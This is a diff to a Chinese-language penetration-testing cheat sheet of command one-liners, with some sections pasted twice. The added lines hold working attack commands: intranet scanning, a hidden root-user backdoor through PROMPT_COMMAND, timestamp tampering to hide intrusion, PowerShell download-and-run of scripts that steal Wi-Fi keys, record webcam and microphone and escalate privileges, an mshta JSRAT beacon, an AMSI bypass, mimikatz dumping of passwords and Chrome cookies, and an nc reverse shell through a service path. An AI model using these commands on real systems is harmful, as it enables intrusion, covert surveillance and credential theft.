@@ -1,4 +1,4 @@
-一条命令揪出ssh登录者物理地址
+﻿一条命令揪出ssh登录者物理地址
 for i in `grep 'sshd' /var/log/auth.log* |grep 'Accepted' |grep ftp| grep -oE  '\<([1-9]|[1-9][0-9]|1[0-9]{2}|2[01][0-9]|22[0-3])\>(\.\<([0-9]|[0-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\>){2}\.\<([1-9]|[0-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-4])\>' | sort  | uniq`; do curl  -s --header "X-Forwarded-For: $i" http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P '(?<=\<center\>您的IP是：).*(?=<\/center)' ; done
 此条命令可获取所有存储在注册表中包含密码的键值
 REG query HKCU  /v "pwd" /s  #pwd可替换为password \ HKCU 可替换为HKCR
@@ -62,10 +62,132 @@ for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i "Pinging"
 这条也是核攻击大牛发的，是用来找域机器对应IP的
 
 FOR /F "eol=- tokens=1 delims=\ " %a IN ('net view') DO @(echo name: %a, ip: & ping %a -w 1 -n 1 | find /i "ttl" & echo.)
+利用powershell对目标内网进行icmp扫描
+
+powershell.exe -exec bypass -Command "Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,8"
+
+在linux下使用各类icmp扫描
+
+#!/bin/bash
+for ip in 192.168.1.{1..254} 
+do 
+
+ping $ip -c 1 &> /dev/null 
+
+if [ $? -eq 0 ];then 
+
+echo $ip is alive .... 
+
+fi 
+done
+nmap的icmp扫描
+
+nmap -sn -PE 192.168.1.0/24
+
+arp扫描
+
+在win下使用各种arp扫描
+
+start /b arpscan.exe -t 192.168.1.0/24 >> result.txt
+
+powershell.exe -exec bypass -Command "Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24"  >> result.txt
+在linux下使用arp扫描
+
+nmap -sn -PR 192.168.1.0/24  尝试arp扫描
+
+
+以下内容为整合内容。首发于个人blog：http://rcoil.me/2017/08/%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F/
+
+咦！使人觉得遥远的不是时间长，而是两三件不可挽回的事。
+
+icmp扫描
+
+基于icmp的各种内网主机发现方式。除了本身自带的命令，也可以考虑使用第三方程序，比如cping,自己写的脚本等。
+
+在win下使用icmp扫描
+
+cmd中执行如下命令，对整个C段进行ping扫描
+
+for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i "ttl"
+B段查找
+
+for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i "Pinging"
+利用powershell对目标内网进行icmp扫描
+
+powershell.exe -exec bypass -Command "Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,8"
+在linux下使用各类icmp扫描
+
+#!/bin/bash
+for ip in 192.168.1.{1..254} 
+do 
+
+ping $ip -c 1 &> /dev/null 
+
+if [ $? -eq 0 ];then 
+
+echo $ip is alive .... 
+
+fi 
+done
+nmap的icmp扫描
+
+nmap -sn -PE 192.168.1.0/24
+arp扫描
+
+在win下使用各种arp扫描
+
+start /b arpscan.exe -t 192.168.1.0/24 >> result.txt
+
+powershell.exe -exec bypass -Command "Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24"  >> result.txt
+在linux下使用arp扫描
+
+nmap -sn -PR 192.168.1.0/24  尝试arp扫描
+处在别人的vpn内网中（kali）
+
+netdiscover -r 192.168.1.0/24 -i eth0
+msf的arp扫描模块
+msf > use  auxiliary/scanner/discovery/arp_sweep
+msf > show options
+msf > set  interface eth0
+msf > set  smac xxxxxxxxx
+msf > set  rhosts 192.168.1.0/24
+msf > set  threads 20
+msf > set  shost 192.168.1.27
+msf > run
+meterpreter
+
+meterpreter > getsystem
+meterpreter > run autoroute -s 192.168.1.0/24
+meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+基于smb和netbios的内网主机发现方式
+
+win下
+
+nbtscan.exe -m  192.168.1.0/24   非常经典的小工具
+linux下
+
+wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz
+...
+./nbtscan -m 192.168.1.0/24
+域内扫描
+
+net view
+dsquery computer  其实,域内最好用的也就是nbtscan了
+Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip
+
+@echo off
+setlocal ENABLEDELAYEDEXPANSION
+@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (
+@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (
+@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k  %%j)
+)
+)
 
 时代在进步，IPV6越来越多了，那位牛来科普下IPV6的知识，应该可以延伸出更多的命令出来
 
 其实这些对于大牛来说只是些命令的简单应用而已，希望有更多实用命令被分享出来，更加利于我们渗透的学习与经验的增长
+
+
 
 各种脚本语言不同版本一句话开启 HTTP 服务器的总结
 Python 2.x
@@ -168,3 +290,226 @@ IIS Express
 C:\> "C:\Program Files (x86)\IIS Express\iisexpress.exe" /path:C:\MyWeb /port:8000
 
 参见：IIS Express and /u/fjantomen
+
+Linux
+
+Linux反弹shell后，方便的交互：
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+无python时：
+
+expect -c 'spawn bash;interact'
+无wget nc等下载工具时下载文件
+
+exec 5<>/dev/tcp/sec-lab.org/80 &&echo -e “GET /c.pl HTTP/1.0\n” >&5 && cat<&5 > c.pl
+
+修改上传文件时间戳(掩盖入侵痕迹)
+
+touch -r 老文件时间戳 新文件时间戳
+
+利用BASH提权
+
+这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户
+$PROMPT_COMMAND 利用这个变量保存了在主提示符$PS1显示之前需要执行的命令
+导入:
+
+export PROMPT_COMMAND=”/usr/sbin/useradd -o -u 0 hack &>/dev/null && echo hacker:123456 | /usr/sbin/chpasswd &>/dev/null && unset PROMPT_COMMAND”
+
+lsof 命令
+
+lsof 1.txt 显示开启文件 abc.txt 的进程
+lsof -i :22 知道 22 端口现在运行什么程序
+lsof -c nsd 显示 nsd 进程现在打开的文件
+lsof -g gid 显示归属 gid 的进程情况
+lsof +d /usr/local/ 显示目录下被进程开启的文件
+lsof +D /usr/local/ 同上，但是会搜索目录下的目录，时间较长
+lsof -d 4 显示使用 fd 为4 的进程
+lsof -i 用以显示符合条件的进程情况
+SSH端口转发
+
+下面文章详细描述了3种方式转发
+http://www.cnblogs.com/david-zha ... /08/18/2645943.html
+
+图片马
+
+Exiftool “-comment<=raj.php” 1.png
+Windows
+
+Powershell 相关
+
+获取无线密码：
+
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Get-WLAN-Keys.ps1');Get-Wlan-Keys "
+
+提权加账号
+
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'"
+
+下载执行：
+
+powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://b.hiphotos.baidu.com/image/pic/item/d009b3de9c82d15825ffd75c840a19d8bd3e42da.jpg','C:\\Users\Public\\test.jpg') & start C:\\Users\\Public\\test.jpg
+
+摄像头录像：
+
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1'); Capture-MiniEye -RecordTime 2 -Path $env:temp\hack.avi"
+
+录音:
+
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1');Get-MicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias 'SECRET'"
+MSHTA
+
+VBSCRIPT EXEC
+
+mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close)
+JAVASCRIPT EXEC
+
+mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
+JSRAT
+
+mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
+Bypass AMSI:
+
+PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+use:
+
+powershell.exe -ExecutionPolicy Bypass -noprofile [Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true);iex(New-Object Net.WebClient).DownloadString(''http://192.168.230.1/msfpayload.ps1'')
+Bypass AV
+
+sqlite3.exe -cmd "select load_extension('1.txt','EP')"
+sqlite3.exe -cmd "select load_extension('\\192.168.1.101\share\1.txt','EP')"
+mimikatz
+
+获取vpn密码
+
+mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit
+读取chrome cookies
+
+mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exit
+mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1" exit
+mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1" exit 
+
+提权常用
+
+// What system are we connected to?
+
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+// Get the hostname and username (if available)
+
+hostname
+echo %username%
+// Get users
+
+net users
+net user [username]
+// Networking stuff
+
+ipconfig /all
+// Printer?
+
+route print
+// ARP-arific
+
+arp -A
+// Active network connections
+
+netstat -ano
+// Firewall fun (Win XP SP2+ only)
+
+netsh firewall show state
+netsh firewall show config
+// Scheduled tasks
+
+schtasks /query /fo LIST /v
+// Running processes to started services
+
+tasklist /SVC
+net start
+// Driver madness
+
+DRIVERQUERY
+// WMIC fun (Win 7/8 -- XP requires admin)
+
+wmic /?
+//Use wmic_info script!
+
+// WMIC: check patch level
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+// Search pathces for given patch
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." 
+// AlwaysInstallElevated fun
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+// Other commands to run to hopefully get what we need
+
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.xml *.ini *.txt
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+// Service permissions
+
+sc query
+sc qc [service_name]
+// Accesschk stuff download link
+
+accesschk.exe /accepteula (always do this first!!!!!)
+accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
+accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
+accesschk.exe -ucqv [service_name]
+// Find all weak folder permissions per drive.
+
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+// Find all weak file permissions per drive.
+
+accesschk.exe -uwqs Users c:\*.*
+accesschk.exe -uwqs "Authenticated Users" c:\*.*
+// Binary planting
+
+sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
+sc config [service_name] obj= ".\LocalSystem" password= ""
+sc qc [service_name] (to verify!)
+net start [service_name]
+CMD
+
+%ProgramData:~0,1%%ProgramData:~9,2% /c echo
+
+命令行下载
+
+certutil -urlcache -split -f example.com/file
+
+寻找网站后台路径的N种姿势
+
+一：间接接触
+
+0x01: search
+
+1. 直接搜索目标可能存在的相关后台路径
+site:target.com intitle:"后台|登录|登陆|验证码|管理员|服务系统|系统登录|认证码|验证身份|管理系统|管理后台|管理平台|mgmt|sysadmin|admin|password|login|manage"
+
+2. 尝试搜索一些文档型资料路径，判断是否包含后台路径
+site:target.com filetype:"doc | docx | pdf | xls | xlsx | ppt | pptx"
+
+3. 在目标链接较少的情况下，可以浏览网站所有路径，顺便观察组成特点，构造出后台路径
+site:target.com
+二：直接接触
+
+0x02: view the site
+
+1. 查看robots.txt文件，查看是否存在网站后台路径
+2. 使用传统路径爆破方式，猜测可能存在的后台路径
+3. 识别网站是否是常见CMS或框架，使用对应的默认路径尝试
+4. 直接浏览目标网站，注意网站界面的左手方和底部，查看是否有后台直达链接
+5. 注意观察Cookies等HTTP头信息，寻找特殊Banner，搜索相关应用框架信息，确定后台路径
+6. 寻找网站页面源码中的特殊Banner，去google搜索或Github等平台查找源码信息，确定后台路径
+7. 尝试手工或自动fuzzing网站，致使其报错，查看是否有相关路径信息，进而猜测后台路径信息
+8. 查看网站页面源码，注意链接路径(特别是上传的图片、文件等资源链接)，验证是否包含后台路径
+0x03: open mind
+
+1. 端口扫描，判断后台是否部署在同一主机的其它端口
+2. 子域名收集，判断后台是否部署在子域名的某台主机上
+3. 利用漏洞(如旁站漏洞、XSS、任意文件读取)，间接获得后台路径地址
+4. 结合网站鲜明的特征信息(个人博客名、域名、机构名)，构造可能存在的后台路径
+5. 网站有开发者、外包公司等信息，尝试社工方式联系客服等相关人员(如想买相同系统,希望看个样例后台页面)，套出默认后台地址
